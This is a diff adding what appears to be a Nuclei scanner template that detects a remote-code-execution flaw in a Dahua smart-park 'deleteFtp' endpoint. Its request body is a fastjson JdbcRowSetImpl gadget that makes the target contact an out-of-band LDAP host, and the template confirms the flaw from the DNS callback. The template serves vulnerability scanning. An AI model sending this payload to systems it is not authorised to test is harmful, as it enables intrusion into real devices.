@@ -1,0 +1,23 @@
+id: dahua-zhyq-deleteftp-rce
+
+info:
+  name: dahua-zhyq-deleteftp-rce
+  author: xxxx
+  severity: high
+  description: dahua-zhyq-deleteftp-rce
+  tags: dahua
+
+http:
+  - raw:
+      - |              
+        POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
+        Host: 
+        Content-Type: application/json
+
+        {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}
+               
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns" 
